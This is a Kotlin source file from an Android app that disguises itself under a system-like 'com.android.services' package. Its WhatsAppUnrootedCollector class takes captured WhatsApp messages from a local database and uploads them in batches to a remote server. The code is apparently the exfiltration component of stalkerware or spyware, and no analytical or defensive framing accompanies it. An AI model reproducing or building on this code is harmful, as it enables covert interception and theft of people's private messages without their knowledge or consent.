package com.android.services.logs.collectors.im.unrooted

import android.content.Context
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.network.RemoteServerHelper
import com.android.services.network.api.NodeServerThreeApi
import com.android.services.network.api.TOSApi
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.logException
import com.android.services.util.logVerbose

class WhatsAppUnrootedCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
    private val tosApi: TOSApi,
) : LogsCollector {

    override fun uploadLogs() {
        if (AppConstants.syncWhatsApp) {
            try {
                val whatsAppList = localDatabaseSource.selectWhatsAppUnrooteds()
                if (whatsAppList.isNotEmpty()) {
                    val endId = whatsAppList[whatsAppList.size - 1].id
                    val startId = whatsAppList[0].id
                    val mWhatsAppSender = RemoteServerHelper(
                        context,
                        AppConstants.WHATS_APP_UNROOTED_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi,
                        startId = startId,
                        endId = endId
                    )
                    mWhatsAppSender.upload(whatsAppList)
                }
            } catch (e: Exception) {
                logException(
                    "${AppConstants.WHATS_APP_UNROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                    throwable = e
                )
            }
        } else {
            logVerbose("${AppConstants.WHATS_APP_UNROOTED_TYPE} Sync is Off")
        }
    }
}